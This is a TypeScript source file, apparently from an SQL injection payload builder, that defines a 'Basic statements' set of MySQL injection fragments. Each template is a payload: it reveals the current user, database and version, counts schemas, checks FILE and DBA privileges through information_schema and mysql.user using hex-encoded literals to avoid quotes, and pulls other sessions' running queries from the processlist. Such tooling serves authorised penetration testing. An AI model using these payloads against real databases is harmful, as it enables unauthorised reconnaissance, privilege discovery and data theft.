import { BuilderSubcategory } from '../../types';

export const basicStatementsSubcategory: BuilderSubcategory = {
  id: 'basic-statements',
  label: 'Basic statements',
  description: 'Classic foundational statements (User/DB/Version, Count DB, Privileges check I_S/mysql.user, Running query)',
  templates: [
    {
      id: 'statement-user-database-version',
      name: 'USER(),DATABASE(),VERSION()',
      description: 'Current user, database name, and MySQL version combined',
      content: 'CONCAT_WS(0x203a20,USER(),DATABASE(),VERSION())'
    },
    {
      id: 'statement-count-databases',
      name: 'Count() DATABASES',
      description: 'Total number of accessible databases on the server',
      content: '(SELECT COUNT(schema_name) FROM information_schema.schemata)'
    },
    {
      id: 'statement-privileges-is',
      name: 'Privileges (via I_S.PRIVILEGES)',
      description: 'Check FILE / admin privileges via information_schema.user_privileges (accessible by any user)',
      content: '(SELECT IF(COUNT(*)>0,0x594553202846494c452050726976696c65676529,0x4e4f) FROM information_schema.user_privileges WHERE privilege_type=0x46494c45)'
    },
    {
      id: 'statement-privileges-mysql-system',
      name: 'Privileges (via MySQL SYSTEM TABLE)',
      description: 'Check File_priv directly from mysql.user table (verifies root / DBA access)',
      content: '(SELECT File_priv FROM mysql.user WHERE user=SUBSTRING_INDEX(USER(),0x40,1) LIMIT 1)'
    },
    {
      id: 'statement-get-running-query',
      name: 'Get running query',
      description: 'Fetch actively running SQL queries from processlist',
      content: '(SELECT info FROM information_schema.processlist WHERE id!=connection_id() ORDER BY time DESC LIMIT 1)'
    }
  ]
};
